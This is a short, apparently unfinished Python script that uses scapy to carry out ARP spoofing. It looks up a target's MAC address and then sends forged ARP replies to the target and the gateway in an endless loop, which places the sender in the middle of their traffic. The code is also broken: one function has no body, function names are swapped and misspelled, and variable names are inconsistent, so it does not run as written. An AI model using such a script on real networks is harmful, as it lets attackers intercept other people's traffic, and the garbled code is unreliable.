import scapy.all as scapy
import argparse

def get_mac():

def get_arguments(ip):
     arp_packet=scapy.ARP(pdst=ip)
     broadcast_packet=scapy.Ether(dst="ff:ff:ff:ff:ff:ff")
     arp_broadcast_packet=broadcast_packet/arp_packet
     answer_list=scapy.srp(arp_broadcast_packet, timeout=1, verbose=False)[0]
     return answer_list[0][1].hwsrc

def spoof(target_ip, spoof_ip):
    target_mac=get_mac(target_ip)
    packet=scapy.ARP(op=2, pdst=target_ip, hwdst=target_mac, psrc=spoof_ip)
    scapy.send(packet)

arguments=get_argumnets()
while True:
    spoof(arguments.target, argument.gateway)
    spoof(argument.gateway, arguments.target)
